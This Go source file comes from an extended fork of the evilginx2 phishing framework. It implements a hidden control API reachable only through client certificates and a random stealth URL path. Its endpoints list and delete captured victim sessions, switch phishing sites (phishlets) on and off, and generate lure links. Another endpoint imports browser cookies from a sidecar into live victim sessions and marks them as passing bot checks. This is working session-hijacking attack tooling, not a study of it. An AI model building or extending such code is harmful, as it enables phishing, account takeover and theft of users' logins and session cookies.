package core

// apid.go — evilginx2-extended: HTTPS REST API with client-certificate auth.
// Parity with Evilginx Pro "Evilginx API" (stealth channel + client cert):
// - separate HTTPS listener, bound to server bind IP
// - mTLS: server requires a client certificate signed by the local API CA
// - stealth base path (random, persisted) — requests outside it get 404
// - endpoints: /status, /sessions, /sessions/{id}
// Fully offline: all certs generated locally, no ACME, no external calls.

import (
	"crypto/rand"
	"crypto/rsa"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const apiStealthLen = 12

type apiMeta struct {
	BasePath string `json:"base_path"`
}

func apiSerial() *big.Int {
	limit := new(big.Int).Lsh(big.NewInt(1), 128)
	n, _ := rand.Int(rand.Reader, limit)
	return n
}

func apiCertTemplate(cn string, isCA bool, ips []net.IP) *x509.Certificate {
	t := &x509.Certificate{
		SerialNumber:          apiSerial(),
		Subject:               pkix.Name{CommonName: cn, Organization: []string{"evilginx2-extended"}},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().AddDate(10, 0, 0),
		KeyUsage:              x509.KeyUsageDigitalSignature | x509.KeyUsageKeyEncipherment,
		ExtKeyUsage:           []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth, x509.ExtKeyUsageClientAuth},
		BasicConstraintsValid: true,
	}
	if isCA {
		t.IsCA = true
		t.KeyUsage |= x509.KeyUsageCertSign
	}
	if len(ips) > 0 {
		t.IPAddresses = ips
		t.DNSNames = []string{"localhost"}
	}
	return t
}

func apiWritePem(path string, typ string, der []byte) error {
	f, err := os.OpenFile(path, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
	if err != nil {
		return err
	}
	defer f.Close()
	return pem.Encode(f, &pem.Block{Type: typ, Bytes: der})
}

func apiGenCert(cn string, isCA bool, ips []net.IP, caCert *x509.Certificate, caKey *rsa.PrivateKey) (*x509.Certificate, *rsa.PrivateKey, error) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, nil, err
	}
	tpl := apiCertTemplate(cn, isCA, ips)
	if isCA {
		caCert, caKey = tpl, key
	}
	der, err := x509.CreateCertificate(rand.Reader, tpl, caCert, &key.PublicKey, caKey)
	if err != nil {
		return nil, nil, err
	}
	cert, err := x509.ParseCertificate(der)
	if err != nil {
		return nil, nil, err
	}
	return cert, key, nil
}

type apiServer struct {
	db   *database.Database
	cfg  *Config
	px   *HttpProxy
	base string
}

func StartApiServer(db *database.Database, cfg *Config, hp *HttpProxy, port int, dir string) {
	if err := os.MkdirAll(dir, 0700); err != nil {
		log.Error("api: %v", err)
		return
	}

	metaPath := filepath.Join(dir, "config.json")
	var meta apiMeta
	if b, err := os.ReadFile(metaPath); err == nil {
		if json.Unmarshal(b, &meta) != nil || len(meta.BasePath) < 4 {
			meta.BasePath = ""
		}
	}
	if meta.BasePath == "" {
		meta.BasePath = "/api-" + GenRandomString(apiStealthLen)
		if b, err := json.MarshalIndent(meta, "", "  "); err == nil {
			os.WriteFile(metaPath, b, 0600)
		}
	}

	caCertPath := filepath.Join(dir, "ca.crt")
	caKeyPath := filepath.Join(dir, "ca.key")
	srvCertPath := filepath.Join(dir, "server.crt")
	srvKeyPath := filepath.Join(dir, "server.key")
	cliCertPath := filepath.Join(dir, "client.crt")
	cliKeyPath := filepath.Join(dir, "client.key")

	// CA: load or create
	var caCert *x509.Certificate
	var caKey *rsa.PrivateKey
	if _, err := os.Stat(caCertPath); err == nil {
		cb, err := os.ReadFile(caCertPath)
		if err != nil {
			log.Error("api: %v", err)
			return
		}
		block, _ := pem.Decode(cb)
		if block == nil {
			log.Error("api: bad CA pem")
			return
		}
		caCert, err = x509.ParseCertificate(block.Bytes)
		if err != nil {
			log.Error("api: %v", err)
			return
		}
		kb, _ := os.ReadFile(caKeyPath)
		kblock, _ := pem.Decode(kb)
		caKey, err = x509.ParsePKCS1PrivateKey(kblock.Bytes)
		if err != nil {
			log.Error("api: %v", err)
			return
		}
	} else {
		caCert, caKey, err = apiGenCert("evilginx2-api-ca", true, nil, nil, nil)
		if err != nil {
			log.Error("api: %v", err)
			return
		}
		if err := apiWritePem(caCertPath, "CERTIFICATE", caCert.Raw); err != nil {
			log.Error("api: %v", err)
			return
		}
		if err := apiWritePem(caKeyPath, "RSA PRIVATE KEY", x509.MarshalPKCS1PrivateKey(caKey)); err != nil {
			log.Error("api: %v", err)
			return
		}
	}

	// server + client certs: always (re)issue if missing
	srvIPs := []net.IP{net.ParseIP("127.0.0.1"), net.ParseIP("::1")}
	if ip := net.ParseIP(cfg.GetServerBindIP()); ip != nil {
		srvIPs = append(srvIPs, ip)
	}
	srvCert, srvKey, err := apiGenCert("evilginx2-api-server", false, srvIPs, caCert, caKey)
	if err != nil {
		log.Error("api: %v", err)
		return
	}
	if err := apiWritePem(srvCertPath, "CERTIFICATE", srvCert.Raw); err != nil {
		log.Error("api: %v", err)
		return
	}
	if err := apiWritePem(srvKeyPath, "RSA PRIVATE KEY", x509.MarshalPKCS1PrivateKey(srvKey)); err != nil {
		log.Error("api: %v", err)
		return
	}
	cliCert, cliKey, err := apiGenCert("evilginx2-api-client", false, nil, caCert, caKey)
	if err != nil {
		log.Error("api: %v", err)
		return
	}
	if err := apiWritePem(cliCertPath, "CERTIFICATE", cliCert.Raw); err != nil {
		log.Error("api: %v", err)
		return
	}
	if err := apiWritePem(cliKeyPath, "RSA PRIVATE KEY", x509.MarshalPKCS1PrivateKey(cliKey)); err != nil {
		log.Error("api: %v", err)
		return
	}

	clientCAPool := x509.NewCertPool()
	clientCAPool.AddCert(caCert)
	tlsCfg := &tls.Config{
		Certificates: []tls.Certificate{{
			Certificate: [][]byte{srvCert.Raw},
			PrivateKey:  srvKey,
		}},
		ClientAuth: tls.RequireAndVerifyClientCert,
		ClientCAs:  clientCAPool,
		MinVersion: tls.VersionTLS12,
	}

	a := &apiServer{db: db, cfg: cfg, px: hp, base: meta.BasePath}
	mux := http.NewServeMux()
	mux.HandleFunc(a.base+"/status", a.handleStatus)
	mux.HandleFunc(a.base+"/sessions", a.handleSessions)
	mux.HandleFunc(a.base+"/sessions/", a.handleSessionDetail)
	mux.HandleFunc(a.base+"/phishlets", a.handlePhishlets)
	mux.HandleFunc(a.base+"/phishlets/", a.handlePhishletAction)
	mux.HandleFunc(a.base+"/lures", a.handleLures)
	mux.HandleFunc(a.base+"/lures/", a.handleLureUrl)
	mux.HandleFunc(a.base+"/pp/cookies", a.handlePuppetCookies)

	srv := &http.Server{
		Addr:      fmt.Sprintf("%s:%d", cfg.GetServerBindIP(), port),
		Handler:   mux,
		TLSConfig: tlsCfg,
		ReadTimeout:  10 * time.Second,
		WriteTimeout: 10 * time.Second,
	}

	log.Info("api: listening on https://%s:%d%s (mTLS, client cert: %s)", cfg.GetServerBindIP(), port, a.base, cliCertPath)
	if err := srv.ListenAndServeTLS("", ""); err != nil {
		log.Error("api: %v", err)
	}
}

func (a *apiServer) handleStatus(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status": "ok",
		"time":   time.Now().Unix(),
	})
}

func (a *apiServer) handleSessions(w http.ResponseWriter, r *http.Request) {
	sessions, err := a.db.ListSessions()
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(sessions)
}

func (a *apiServer) handleSessionDetail(w http.ResponseWriter, r *http.Request) {
	idStr := r.URL.Path[len(a.base)+len("/sessions/"):]
	id, err := strconv.Atoi(idStr)
	if err != nil {
		http.Error(w, `{"error":"bad session id"}`, http.StatusBadRequest)
		return
	}
	if r.Method == "DELETE" {
		if err := a.db.DeleteSessionById(id); err != nil {
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusNotFound)
			return
		}
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"deleted": idStr})
		return
	}
	s, err := a.db.GetSessionById(id)
	if err != nil {
		http.Error(w, `{"error":"not found"}`, http.StatusNotFound)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(s)
}

func (a *apiServer) handlePhishlets(w http.ResponseWriter, r *http.Request) {	out := []map[string]interface{}{}
	for _, n := range a.cfg.GetPhishletNames() {
		out = append(out, map[string]interface{}{
			"name":    n,
			"enabled": a.cfg.IsSiteEnabled(n),
			"hidden":  a.cfg.IsSiteHidden(n),
		})
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(out)
}

func (a *apiServer) handlePhishletAction(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, http.StatusMethodNotAllowed)
		return
	}
	parts := strings.Split(strings.TrimPrefix(r.URL.Path, a.base+"/phishlets/"), "/")
	if len(parts) != 2 {
		http.Error(w, `{"error":"expected /phishlets/{name}/{enable|disable}"}`, http.StatusBadRequest)
		return
	}
	name, action := parts[0], parts[1]
	var err error
	switch action {
	case "enable":
		err = a.cfg.SetSiteEnabled(name)
	case "disable":
		err = a.cfg.SetSiteDisabled(name)
	default:
		http.Error(w, `{"error":"unknown action"}`, http.StatusNotFound)
		return
	}
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusBadRequest)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"result": action + " " + name + " ok"})
}

func (a *apiServer) handleLures(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		Phishlet    string `json:"phishlet"`
		Path        string `json:"path"`
		RedirectUrl string `json:"redirect_url"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.Phishlet == "" {
		http.Error(w, `{"error":"body must be {\"phishlet\": \"...\", ...}"}`, http.StatusBadRequest)
		return
	}
	if _, err := a.cfg.GetPhishlet(req.Phishlet); err != nil {
		http.Error(w, `{"error":"unknown phishlet"}`, http.StatusBadRequest)
		return
	}
	l := &Lure{
		Phishlet:    req.Phishlet,
		Path:        req.Path,
		RedirectUrl: req.RedirectUrl,
	}
	if l.Path == "" {
		l.Path = "/" + GenRandomString(8)
	}
	a.cfg.AddLure(req.Phishlet, l)
	// find the index it landed on (lab scale: scan)
	idx := -1
	for i := 0; i < 4096; i++ {
		g, err := a.cfg.GetLure(i)
		if err != nil {
			break
		}
		if g.Phishlet == l.Phishlet && g.Path == l.Path {
			idx = i
			break
		}
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{"id": idx, "path": l.Path})
}

func (a *apiServer) handleLureUrl(w http.ResponseWriter, r *http.Request) {
	rest := strings.TrimPrefix(r.URL.Path, a.base+"/lures/")
	if !strings.HasSuffix(rest, "/url") {
		http.Error(w, `{"error":"expected /lures/{id}/url"}`, http.StatusNotFound)
		return
	}
	id, err := strconv.Atoi(strings.TrimSuffix(rest, "/url"))
	if err != nil {
		http.Error(w, `{"error":"bad lure id"}`, http.StatusBadRequest)
		return
	}
	l, err := a.cfg.GetLure(id)
	if err != nil {
		http.Error(w, `{"error":"lure not found"}`, http.StatusNotFound)
		return
	}
	pl, err := a.cfg.GetPhishlet(l.Phishlet)
	if err != nil {
		http.Error(w, `{"error":"phishlet not found"}`, http.StatusInternalServerError)
		return
	}
	var base string
	if l.Hostname != "" {
		base = "https://" + l.Hostname + l.Path
	} else {
		purl, err := pl.GetLureUrl(l.Path)
		if err != nil {
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusBadRequest)
			return
		}
		base = purl
	}
	params := r.URL.Query()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"url": BuildLureUrl(a.cfg, base, &params)})
}

type ppCookieIn struct {
	Name     string `json:"name"`
	Value    string `json:"value"`
	Path     string `json:"path"`
	Domain   string `json:"domain"`
	HttpOnly bool   `json:"http_only"`
}

// handlePuppetCookies — evilpuppet sidecar pushes browser cookies for a
// live session (Pro "Evilpuppet" v1: real-browser session enrichment).
func (a *apiServer) handlePuppetCookies(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		http.Error(w, `{"error":"POST required"}`, http.StatusMethodNotAllowed)
		return
	}
	var req struct {
		SessionToken string       `json:"session_token"`
		Phishlet     string       `json:"phishlet"`
		Cookies      []ppCookieIn `json:"cookies"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil || req.SessionToken == "" {
		http.Error(w, `{"error":"bad payload"}`, http.StatusBadRequest)
		return
	}
	if err := a.px.ImportPuppetCookies(req.SessionToken, req.Phishlet, req.Cookies); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusBadRequest)
		return
	}
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"result": "imported"})
}

// ImportPuppetCookies merges evilpuppet browser cookies into the live
// session (memory + sqlite) and marks the session botguard-verified (a real
// browser produced them).
func (p *HttpProxy) ImportPuppetCookies(sid string, phishlet string, cookies []ppCookieIn) error {
	s, ok := p.sessions[sid]
	if !ok {
		return fmt.Errorf("session not found: %s", sid[:bgMin(8, len(sid))])
	}
	for _, ck := range cookies {
		domain := ck.Domain
		if domain == "" {
			continue
		}
		exp := time.Now().Add(24 * time.Hour)
		s.AddCookieAuthToken(domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, exp)
	}
	if err := p.db.SetSessionCookieTokens(sid, s.CookieTokens); err != nil {
		return err
	}
	st := p.bgState(sid)
	p.bg_mtx.Lock()
	st.verified = true
	p.bg_mtx.Unlock()
	log.Info("puppet: imported %d cookies into session %s", len(cookies), sid[:bgMin(8, len(sid))])
	return nil
}
